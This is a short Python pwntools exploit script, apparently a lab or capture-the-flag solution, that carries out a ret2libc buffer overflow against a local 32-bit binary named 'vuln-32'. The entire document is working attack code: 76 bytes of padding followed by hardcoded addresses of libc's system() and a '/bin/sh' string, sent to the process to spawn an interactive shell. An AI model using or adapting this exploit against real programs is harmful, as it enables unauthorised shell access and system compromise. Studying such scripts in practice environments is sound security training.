from pwn import *

p = process('./vuln-32', level='debug')
# gdb.attach(p, gdbscript='break *vuln+43')

libc_base = 0xf7dc2000
offset_to_system = libc_base + 0x00049720
offset_to_binsh = libc_base + 0x1b8fd1
padding = 76

payload = b'A' * padding
payload += p32(offset_to_system)
payload += p32(0x0)
payload += p32(offset_to_binsh)

p.clean()
p.sendline(payload)
p.interactive()

